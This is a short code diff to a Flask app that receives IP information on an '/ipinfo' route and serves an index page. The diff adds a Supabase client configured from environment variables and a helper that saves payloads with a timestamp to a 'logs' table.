@@ -8,6 +8,15 @@ else:
      os.mkdir('image')       
 PATH_TO_IMAGES_DIR = 'image'
 app = Flask(__name__)
+
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
+
+supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+
+
+
+
 import logging
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
@@ -15,6 +24,14 @@ log.setLevel(logging.ERROR)
 @app.route('/')
 def index():
    return Response(open('index.html').read(), mimetype="text/html")
+
+def save_to_db(payload):
+    supabase.table("logs").insert({
+        "data": payload,
+        "created_at": datetime.utcnow().isoformat()
+    }).execute()
+
+
 @app.route('/ipinfo',methods=['POST'])
 def ipinfos():
       iplogs = request.get_json()
